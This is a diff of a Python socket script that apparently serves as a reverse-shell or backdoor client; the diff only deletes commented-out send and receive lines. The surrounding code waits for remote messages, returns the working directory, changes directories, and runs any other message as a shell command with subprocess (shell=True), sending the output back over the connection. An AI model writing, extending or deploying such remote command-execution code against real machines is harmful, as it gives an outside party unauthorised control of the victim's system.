@@ -31,12 +31,10 @@ def receive():
     while True:
         try:
             message=reliable_recv(client)
-            #message=client.recv(1024).decode("ascii")
             print(message)
             if message=="LOC":
                 message=(os.getcwd()+":")
                 reliable_send(message,client)
-                #client.send(message.encode('ascii'))
             elif message=="exit":
                 client.close()
                 print("Close")
@@ -45,17 +43,14 @@ def receive():
                 os.chdir(message)
                 message=(os.getcwd()+":")
                 reliable_send(message,client)
-                #client.send(message.encode('ascii'))
             else:
                 print("esle")
                 message=subprocess.run(message,shell=True,capture_output=True,text=True)
                 if message.stdout:
                     print(message.stdout)
                     reliable_send(message.stdout,client)
-                    #client.send(message.stdout.encode('ascii'))
                 else:
                     reliable_send(message.stdout,client)
-                    #client.send("Error".stdout.encode('ascii'))
 
         except:
             print("Error")
